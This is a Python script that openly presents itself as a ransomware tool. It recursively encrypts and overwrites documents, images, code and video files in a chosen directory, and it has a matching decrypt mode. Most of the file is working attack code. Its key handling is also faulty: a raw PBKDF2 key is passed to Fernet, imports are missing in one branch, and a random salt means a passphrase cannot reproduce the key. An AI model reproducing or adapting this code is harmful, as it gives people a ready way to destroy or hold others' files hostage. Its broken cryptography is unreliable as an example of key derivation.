import os
import sys
import time
from pathlib import Path
from cryptography.fernet import Fernet
from colorama import Fore, Back, Style
from pyfiglet import Figlet
from getpass import getpass


# C:\Users\mudas\OneDrive\Desktop\ransom_victom

# ==============================================================================
# 🛡️ GLOBAL CONSTANTS AND CONFIGURATION
# ==============================================================================
# The key MUST be managed securely. For this example, we derive it or ask for it.
# In a real-world scenario, this key management is the most critical part.
ENCRYPTION_ALGORITHM = "Fernet (AES-based)"

# File extensions to target (you can customize this list)
TARGET_EXTENSIONS = ['.txt', '.docx', '.pdf', '.jpg', '.png', '.py', '.md', '.xlsx', '.pptx','.html','.py','.mp4']

# ==============================================================================
# 🧑‍💻 CORE UTILITY FUNCTIONS (The Developers & Bug Hunters)
# ==============================================================================

def setup_cli():
    """Initializes and displays the visual banner."""
    fig = Figlet(font='slant')
    banner = fig.renderText("DIG-ONE RANSOMWARE SUITE")
    print(f"\n{Fore.CYAN}{Back.BLUE}{banner}")
    print(f"{Style.BRIGHT}{Fore.GREEN}====================================================")
    print(f"{Fore.YELLOW}DIG-ONE: The Ultimate Encryption Payload v1.0")
    print(f"{Style.BRIGHT}{Fore.GREEN}====================================================\n")

def get_encryption_key():
    """Securely prompts the user to generate or retrieve the key."""
    print(f"{Fore.YELLOW}[Key Management]: Setting up encryption key...")

    # --- Key Derivation/Generation Logic (Expert/Black Hacker Role) ---
    try:
        # 1. Attempt to load a key from environment variable or local file (best practice)
        key_file = "ransom_key.key"
        if os.path.exists(key_file):
            print(f"  [+] Found existing key file: {key_file}. Using it.")
            with open(key_file, 'rb') as f:
                return f.read()

        # 2. If no file, prompt user interaction (Safe Mode)
        print(f"  [!] No key file found. Generating a new key or prompting user.")

        # Offer to generate a new key or use a known passphrase
        while True:
            choice = input(f"{Fore.CYAN}Do you want to [G]enerate a new key, [L]oad key from memory (enter phrase), or [E]xit? ").strip().lower()
            if choice == 'g':
                print(f"{Fore.MAGENTA}--- Generating Secure Key ---")
                from cryptography.hazmat.primitives import hashes
                from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

                password = getpass("Enter secure passphrase for key derivation: ")
                salt = os.urandom(16)
                kdf = PBKDF2HMAC(
                    algorithm=hashes.SHA256(),
                    length=32,
                    salt=salt,
                    iterations=100000
                )
                key = kdf.derive(password.encode())
                return Fernet(key)

            elif choice == 'l':
                passphrase = getpass("Enter passphrase to derive key: ")
                salt = os.urandom(16)
                kdf = PBKDF2HMAC(
                    algorithm=hashes.SHA256(),
                    length=32,
                    salt=salt,
                    iterations=100000
                )
                key = kdf.derive(passphrase.encode())
                return Fernet(key)

            elif choice == 'e':
                print(f"{Fore.RED}Exiting setup.")
                return None
            else:
                print(f"{Fore.RED}Invalid choice. Try again.")

    except Exception as e:
        print(f"{Fore.RED}[CRITICAL ERROR in Key Setup]: {e}")
        return None

# ==============================================================================
# 💥 RANSOMWARE ENGINE (The Malware Maker & Hacker)
# ==============================================================================

def encrypt_file(file_path: Path, fermone: Fernet) -> (bool, str):
    """Encrypts a single file by overwriting its contents."""
    try:
        print(f"    -> Encrypting: {file_path.name}")

        # 1. Read original data
        original_data = file_path.read_bytes()

        # 2. Encrypt the data
        encrypted_data = fermone.encrypt(original_data)

        # 3. Write the encrypted data back (Overwrite)
        file_path.write_bytes(encrypted_data)

        # Metadata/Info gathering (Crucial for recovery)
        encrypted_size = len(encrypted_data)
        original_size = len(original_data)

        if original_size != encrypted_size:
             return True, f"Size changed: {original_size} bytes -> {encrypted_size} bytes."
        return True, "Success: File encrypted."

    except PermissionError:
        return False, "Permission Denied: Could not write to this file."
    except FileNotFoundError:
        return False, "File Not Found: Path disappeared during operation."
    except Exception as e:
        return False, f"Unhandled Encryption Error: {e}"


def ransomware_attack(target_dir: Path, fermone: Fernet):
    """Traverses the directory and applies encryption to target files."""
    print(f"\n{Fore.MAGENTA}{Style.BRIGHT}--- INITIATING ATTACK MODE ---")
    print(f"Target Directory: {target_dir}")

    total_files = 0
    successful_encryptions = 0
    total_size_bytes = 0

    for item in target_dir.rglob('*'):
        if item.is_file():
            total_files += 1

            # Check if the file extension is in our target list
            if item.suffix.lower() in TARGET_EXTENSIONS:
                success, message = encrypt_file(item, fermone)

                if success:
                    successful_encryptions += 1
                    print(f"{Fore.GREEN}   [OK] {item.name} | Details: {message}")
                else:
                    print(f"{Fore.RED}   [FAIL] {item.name} | Error: {message}")

    print("\n" + "="*60)
    print(f"{Fore.MAGENTA}{Style.BRIGHT}--- ATTACK SUMMARY ---")
    print(f"Total files scanned: {total_files}")
    print(f"{Fore.CYAN}Successfully encrypted files: {successful_encryptions}")
    print(f"{Fore.YELLOW}Encryption Complete. Files are encrypted.")
    print("="*60)

# ==============================================================================
# 💎 RECOVERY ENGINE (The Plainer & Expert)
# ==============================================================================

def decrypt_directory(target_dir: Path, fermone: Fernet):
    """Traverses the directory and attempts to decrypt files."""
    print(f"\n{Fore.MAGENTA}{Style.BRIGHT}--- INITIATING DECRYPTION MODE ---")
    print(f"Target Directory: {target_dir}")

    decrypted_count = 0

    # We iterate through the directory again. Since we overwrote the files,
    # the encrypted version IS the file we try to decrypt.
    for item in target_dir.rglob('*'):
        if item.is_file():
            if item.suffix.lower() in TARGET_EXTENSIONS:
                try:
                    print(f"    -> Decrypting: {item.name}")

                    # Read the encrypted content
                    encrypted_data = item.read_bytes()

                    # Attempt decryption
                    decrypted_data = fermone.decrypt(encrypted_data)

                    # Write back the decrypted data (Overwriting the cipher)
                    item.write_bytes(decrypted_data)

                    decrypted_count += 1
                    print(f"{Fore.GREEN}   [OK] {item.name} | Decrypted successfully.")

                except Exception as e:
                    print(f"{Fore.RED}   [FAIL] {item.name} | Could not decrypt. It might not be encrypted or the key is wrong. Error: {e}")

    print("\n" + "="*60)
    print(f"{Fore.MAGENTA}{Style.BRIGHT}--- DECRYPTION SUMMARY ---")
    # print(f"{Fore.CYAN}Attempted to decrypt {len(list(target_dir.rglob('*'))))} files.")
    print(f"{Fore.CYAN}Attempted to decrypt {len(list(target_dir.rglob('*')))} files.")

    print(f"{Fore.GREEN}Successfully decrypted {decrypted_count} files.")
    print(f"{Fore.YELLOW}Decryption process finished.")
    print("="*60)


# ==============================================================================
# 🚀 MAIN EXECUTION BLOCK (The Coordinator)
# ==============================================================================

def main_controller():
    """Main function to guide the user through the ransomware process."""

    # 1. Setup and Initialization
    setup_cli()

    # 2. Get Target Directory from User (Crucial for safety)
    while True:
        target_input = input(f"{Fore.YELLOW}Enter the directory to attack/recover (e.g., C:\\Users\\mudas\\OneDrive\\Desktop\\ransom_victom): ").strip()
        if not target_input:
            print(f"{Fore.RED}Directory path cannot be empty.")
            continue

        target_path = Path(target_input)
        if not target_path.is_dir():
            print(f"{Fore.RED}Error: '{target_input}' is not a valid directory or does not exist.")
        else:
            print(f"{Fore.GREEN}Target directory validated: {target_path.resolve()}")
            break

    # 3. Key Setup (The core security element)
    fermone = get_encryption_key()
    if fermone is None:
        print(f"{Fore.RED}Could not initialize encryption key. Exiting.")
        return

    # 4. User Menu Loop (User Friendly Interface)
    while True:
        print("\n" + "="*60)
        print(f"{Fore.CYAN}CHOOSE ACTION:")
        print(f"{Fore.LIGHTBLUE_BACKGROUND}{Style.BRIGHT} [1] ATTACK (Encrypt Files)")
        print(f"{Fore.LIGHTBLUE_BACKGROUND}{Style.BRIGHT} [2] RECOVER (Decrypt Files)")
        print(f"{Fore.LIGHTBLUE_BACKGROUND}{Style.BRIGHT} [3] Exit Program")
        print("="*60)

        choice = input("Enter your choice (1, 2, or 3): ").strip()

        if choice == '1':
            # Attack Mode
            try:
                ransomware_attack(Path(target_path), fermone)
            except Exception as e:
                print(f"{Fore.DARKRED}FATAL EXCEPTION during Attack: {e}")

        elif choice == '2':
            # Recovery Mode
            try:
                decrypt_directory(Path(target_path), fermone)
            except Exception as e:
                print(f"{Fore.DARKRED}FATAL EXCEPTION during Recovery: {e}")

        elif choice == '3':
            print(f"\n{Fore.CYAN}Shutting down ransomware suite. Goodbye!")
            break

        else:
            print(f"{Fore.YELLOW}Invalid choice. Please select 1, 2, or 3.")

if __name__ == "__main__":
    # Ensure the script runs with the highest necessary level of detail
    try:
        main_controller()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}{Style.BRIGHT}Process interrupted by user (Ctrl+C). Exiting gracefully.")
